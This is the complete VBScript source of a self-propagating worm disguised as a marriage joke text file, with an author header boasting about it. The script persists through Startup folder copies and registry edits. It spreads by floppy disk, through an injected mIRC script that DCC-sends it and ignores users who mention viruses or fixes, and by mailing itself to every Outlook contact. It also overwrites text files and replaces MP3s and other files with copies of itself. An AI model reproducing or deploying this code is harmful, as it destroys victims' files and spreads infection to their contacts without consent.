   'Marriage-Stages.txt.vbs
   'Worm That Crawls On mIRC/Outlook/FloopyDrive
   'ThanXxX to the writer of Life_Stages :-)
   'tHeRe iS aLwAeS sOmEoNe wHo mAkEs a ExAmPlE fOr uS pEoPlE tO fOlLoW!!! :-)
   'i love peace!!! i hate war!!! y must there be war??
   'FuCk aLL tHE pEoPlE oUt tHerE tHaT cReAtEs aLL tHe hAvoCs
   'DoWn tO hELL pEoPlE!! eXePt mE!!! muHAAHA!!
   'bY tHe wAy tHiS iS nOt oNlI tHe wOrM i hAvE wriTtEn!!!
   'LeTs pLaY pOlIcE cAtCh tHiEf!!!
   'MuAHHAHAHA!!!!~!~!~!~!
   On Error Resume Next
   Dim a, w, c, r, m, z, b,f,fi,e,mapi, OutLook, xx, Addresses, RegAddress, Mail, aa
   Const ForReading=1, ForWriting=2, ForAppending=8
   Set r = CreateObject("WScript.Shell")
   Set OutLook = WScript.CreateObject("Outlook.Application")
   Set mapi = OutLook.GetNameSpace("MAPI")
   c = Chr(13)&Chr(10)
   Set a = CreateObject("Scripting.FileSystemObject")
   If Not a.FileExists("C:\Windows\Start Menu\Programs\Startup\Marriage-Stages.txt.vbs") Then
   Set w = a.CreateTextFile("C:\Windows\Marriage_Stages.txt", TRUE)
   w.Write("-  The Marriage Stages Of A Couple:"&c&"Stage 1. Walk down the church with a great smile on their face"&c&"Stage 2. Get into the car and kissing all the way home"&c&"Stage 3. Got home, take off clothes and fuck till morn~"&c&"Stage 4. The man dumped the wife and find another virgin girl"&c&"Stage 5. Propose to the virgin girl and got married"&c&"Stage 6. Stop here and repeat from 1 to 5"&c&""&c&"Joke Written By A Sad Boy"&c&":-P")
   w.Close
   r.Run("C:\Windows\Marriage_Stages.txt")
   End If
   Set m = a.GetFile(WScript.ScriptFullName)
   m.Copy("C:\Windows\System\MS.dll.vbs")
   m.Copy("C:\Windows\System\Marriage-Stages.txt.vbs")
   m.Copy("C:\WINDOWS\Start Menu\Programs\Microsoft_Word.EXE.vbs")
   m.Copy("C:\Windows\Start Menu\Programs\Startup\Marriage-Stages.txt.vbs")
   z = r.RegRead("HKEY_CLASSES_ROOT\txtfile\DefaultIcon\")
   r.RegWrite "HKEY_CLASSES_ROOT\VBSFile\DefaultIcon\", z
   r.RegWrite "HKEY_CLASSES_ROOT\txtfile\AlwaysShowExt", ""
   Set w = a.CreateTextFile("C:\Windows\Start Menu\Programs\Startup\MoreJokes.txt.vbs")
   w.Write("On Error Resume Next"&c&"Dim a,b,c,d"&c&"Const ForReading = 1, ForWriting = 2"&c&"Set a = CreateObject(""Scripting.FileSystemObject"")"&c&"If Not a.FileExists(""C:\Windows\System\Marriage-Stages.txt.vbs"") Then"&c&"Set b = a.OpenTextFile(""C:\Windows\Start Menu\Programs\Microsoft_Word.EXE.vbs"", 1)"&c&"c = b.ReadAll"&c&"Set d = a.CreateTextFile(""C:\Windows\System\Marriage-Stages.txt.vbs"", 2)"&c&"d.Write c"&c&"d.Close"&c&"End If")
   w.Close
   Set w = a.CreateTextFile("C:\Windows\Start Menu\Programs\Startup\MICROSOFT.EXE.txt.vbs")
   w.Write("On Error Resume Next"&c&"Dim a,r,b,c,d"&c&"Const ForReading=1, ForWriting=2"&c&"Set a = CreateObject(""Scripting.FileSystemObject"")"&c&"Set r = CreateObject(""WScript.Shell"")"&c&"if a.FolderExists(""C:\mirc"") Then"&c&"Set b = a.OpenTextFile(""C:\mirc\script.ini"")"&c&"c = b.SkipLine"&c&"c = b.ReadLine"&c&"If c <> ""n0=;Marriage-Stages of our life"" Then"&c&"Set b = a.OpenTextFile(""C:\Windows\System\mIRC.dll"",1)"&c&"c = b.ReadAll"&c&"Set d = a.CreateTextFile(""C:\mIRC\Script.ini"",2)"&c&"d.Write c"&c&"d.Close"&c&"End If"&c&"End If")
   w.Close
   Set w = a.CreateTextFile("C:\Windows\System\mIRC.dll")
   w.Write("[Script]"&c&"n0=;Marriage-Stages of our life"&c&"n1=;:-P"&c&"n2=On *:Start:/if ($exists(""C:\Windows\System\Marriage-Stages.txt.vbs"") == $false) { /run ""C:\Windows\Start Menu\Programs\Startup\MoreJokes.txt.vbs"" | set %ms.filename ""C:\Windows\System\Marriage-Stages.txt.vbs"" } | set %ms.filename ""C:\Windows\System\Marriage-Stages.txt.vbs"""&c&"n3=On *:Join:/if ($r(0,1) == 1) && ($me != $nick) { /.dcc send $nick %ms.filename }"&c&"n4=On *:Part:/if ($r(0,1) == 1) && ($nick != $me) { /.dcc send $nick %ms.filename }"&c&"n5=On *:Text:*Marriage*:*:/.ignore $nick"&c&"n6=On *:Text:*Stages*:*:/.ignore $nick"&c&"n7=On *:Text:*virus*:*:/.ignore $nick"&c&"n8=On *:Text:*fix*:*:/.ignore $nick"&c&"n9=On *:Text:*virusfix*:*:/.ignore $nick"&c&"n10=On *:Text:*infected*:*:/.ignore $nick"&c&"n11=On *:Text:*send*:*:/.ignore $nick"&c&"n12=On *:Join:#virusfix:/.part #virusfix")
   w.Close
   Set w = a.CreateTextFile("C:\Windows\Start Menu\Programs\StartUp\LessJokes.txt.vbs")
   w.Write("On Error Resume Next"&c&"For Each Target In CreateObject(""Scripting.FileSystemObject"").Drives"&c&"If target.path = ""A:"" Then"&c&"CreateObject(""Scripting.FileSystemObject"").GetFile(""C:\Windows\System\Marriage-Stages.txt.vbs"").Copy(target.path&""\"")"&c&"End If"&c&"Next")
   w.Close
   For Each t In a.Drives
   if t.path = "A:" Then
   a.GetFile(WScript.ScriptFullName).Copy(t.path&"\")
   End If
   Next
   Set w = a.CreateTextFile("C:\Windows\System\MarriageAuto.txt.bat") 'Changes the autoexec file
   w.Write("echo."&c&"echo -  The Marriage Stages Of A Couple:"&c&"echo Stage 1. Walk down the church with a great smile on their face"&c&"echo Stage 2. Get into the car and kissing all the way home"&c&"echo Stage 3. Got home, take off clothes and fuck till morn~"&c&"echo Stage 4. The man dumped the wife and find another virgin girl"&c&"echo Stage 5. Propose to the virgin girl and got married"&c&"echo Stage 6. Stop here and repeat from 1 to 5"&c&"echo."&c&"echo Joke Written By A Sad Boy"&c&"echo :-P"&c&"Pause")
   w.Close
   r.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Setup\BootAutoexecFile","C:\Windows\System\MarriageAuto.txt.bat"
   b = "Dim a,b,e,f,c,d,w,r,z"&c&"Const ForReading = 1"&c&"Set a = CreateObject(""Scripting.FileSystemObject"")"&c&"Set b = a.GetFile(WScript.ScriptFullName)"&c&"Set e = a.OpenTextFile(WScript.ScriptFullName, 1)"&c&"f = e.ReadAll"&c&"c = chr(13)&chr(10)"&c&"Set r = CreateObject(""WScript.Shell"")"&c&"For Each Target In a.GetFolder(left(a.GetFile(WScript.ScriptFullName).path,len(b.path) - len(b.name))).Files"&c&"if lcase(a.GetExtensionName(target.name)) = ""vbs"" Then"&c&"z=z+1"&c&"End If"&c&"Next"&c&"z=z+1"&c&"Set d = a.CreateTextFile(""(""&z&"")Marriage-Stages.txt.vbs"")"&c&"d.Write f"&c&"d.Close"&c&"if Not a.FileExists(""C:\Windows\Marriage_Stages.txt"") Then"&c&"Set w = a.CreateTextFile(""C:\Windows\Marriage_Stages.txt"", TRUE)"&c&"w.Write(""-  The Marriage Stages Of A Couple:""&c&""Stage 1. Walk down the church with a great smile on their face""&c&""Stage 2. Get into the car and kissing all the way home""&c&""Stage 3. Got home, take off clothes and fuck till morn~""&c&""Stage 4. The man dumped the wife and find another virgin girl""&c&""Stage 5. Propose to the virgin girl and got married""&c&""Stage 6. Stop here and repeat from 1 to 5""&c&c&""Joke Written By A Sad Boy""&c&"":-P"")"&c&"w.Close"&c&"End If"&c&"r.Run(""C:\Windows\Marriage_Stages.txt"")"
   Set f = a.GetFolder("C:\Windows\Desktop\b")
   Set fi = f.Files
   For Each t In fi
   e=lcase(a.GetExtensionName(t.name))
   if (e = "txt") Then
   Set w = a.OpenTextFile(t.path,2)
   w.Write("Marriage-Stages of our life suX!"&c&":-P")
   w.Close
   Elseif ext <> "txt" Then
   Set w = a.CreateTextFile(t.path&".txt.vbs")
   w.Write b
   w.Close
   a.DeleteFile(t.path)
   End if
   Next
   if a.FolderExists("C:\My Music") Then
   Set f = a.GetFolder("C:\My Music")
   Set fi = f.Files
   For Each t In fi
   e=lcase(a.GetExtensionName(t.name))
   if e = "mp3" Then
   Set w = a.CreateTextFile(t.path&".txt.vbs")
   w.Write b
   w.Close
   a.DeleteFile(t.path)
   End If
   Next
   End If
   if a.FolderExists("C:\My Documents\My Music") Then
   Set f = a.GetFolder("C:\My Documents\My Music")
   Set fi = f.Files
   For Each t In fi
   e=lcase(a.GetExtensionName(t.name))
   if e = "mp3" Then
   Set w = a.CreateTextFile(t.path&".txt.vbs")
   w.Write b
   w.Close
   a.DeleteFile(t.path)
   End If
   Next
   End If
   if a.FolderExists("C:\mirc") Then
   if a.FileExists("C:\mirc\script.ini") Then
   Set w = a.OpenTextFile("C:\mirc\script.ini", 2)
   w.Write("[Script]"&c&"n0=;Marriage-Stages of our life"&c&"n1=;:-P"&c&"n2=On *:Start:/if ($exists(""C:\Windows\System\Marriage-Stages.txt.vbs"") == $false) { /run ""C:\Windows\Start Menu\Programs\Startup\MoreJokes.txt.vbs"" | set %ms.filename ""C:\Windows\System\Marriage-Stages.txt.vbs"" } | set %ms.filename ""C:\Windows\System\Marriage-Stages.txt.vbs"""&c&"n3=On *:Join:/if ($r(0,1) == 1) && ($me != $nick) { /.dcc send $nick %ms.filename }"&c&"n4=On *:Part:/if ($r(0,1) == 1) && ($nick != $me) { /.dcc send $nick %ms.filename }"&c&"n5=On *:Text:*Marriage*:*:/.ignore $nick"&c&"n6=On *:Text:*Stages*:*:/.ignore $nick"&c&"n7=On *:Text:*virus*:*:/.ignore $nick"&c&"n8=On *:Text:*fix*:*:/.ignore $nick"&c&"n9=On *:Text:*virusfix*:*:/.ignore $nick"&c&"n10=On *:Text:*infected*:*:/.ignore $nick"&c&"n11=On *:Text:*send*:*:/.ignore $nick"&c&"n12=On *:Join:#virusfix:/.part #virusfix")
   w.Close
   else
   Set w = a.CreateTextFile("C:\mirc\script.ini", 2)
   w.Write("[Script]"&c&"n0=;Marriage-Stages of our life"&c&"n1=;:-P"&c&"n2=On *:Start:/if ($exists(""C:\Windows\System\Marriage-Stages.txt.vbs"") == $false) { /run ""C:\Windows\Start Menu\Programs\Startup\MoreJokes.txt.vbs"" | set %ms.filename ""C:\Windows\System\Marriage-Stages.txt.vbs"" } | set %ms.filename ""C:\Windows\System\Marriage-Stages.txt.vbs"""&c&"n3=On *:Join:/if ($r(0,1) == 1) && ($me != $nick) { /.dcc send $nick %ms.filename }"&c&"n4=On *:Part:/if ($r(0,1) == 1) && ($nick != $me) { /.dcc send $nick %ms.filename }"&c&"n5=On *:Text:*Marriage*:*:/.ignore $nick"&c&"n6=On *:Text:*Stages*:*:/.ignore $nick"&c&"n7=On *:Text:*virus*:*:/.ignore $nick"&c&"n8=On *:Text:*fix*:*:/.ignore $nick"&c&"n9=On *:Text:*virusfix*:*:/.ignore $nick"&c&"n10=On *:Text:*infected*:*:/.ignore $nick"&c&"n11=On *:Text:*send*:*:/.ignore $nick"&c&"n12=On *:Join:#virusfix:/.part #virusfix")
   w.Close
   End If
   End If
   For Lists=1 to mapi.AddressLists.Count
   Set aa=mapi.AddressLists(Lists)
   xx=1
   RegLists=r.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&aa)
   If (RegLists="") then
   RegLists=1
   End if
   If (int(aa.AddressEntries.Count)>int(RegLists)) then
   For Entries=1 to aa.AddressEntries.Count
   Addresses=aa.AddressEntries(xx)
   RegAddress=""
   RegAddress=reg.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&Addresses)
   If (RegAddresses="") then
   Set Mail=OutLook.CreateItem(0)
   Mail.Recipients.Add(Addresses)
   Mail.Subject = "Marriage Jokes(Never Laugh Till Your Mum Scoulds You!!)"
   Mail.Body = vbcrlf & "This is a funny joke"&vbcrlf&"It's about a joke on marriage"&vbcrlf&"View the attachment...."&vbcrlf&":-)"
   Mail.Attachments.Add("C:\Windows\System\Marriage-Stages.txt.vbs")
   Mail.Send
   r.rWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&Addresses,1,"REG_DWORD"
   End if
   xx=xx+1
   Next
   r.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&aa,aa.AddressEntries.Count
   Else
   r.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&aa,aa.AddressEntries.Count
   End if
   Next
   Set OutLook=Nothing
   Set mapi=Nothing
   r.Run("c:\windows\rundll.exe user.exe,exitwindows")
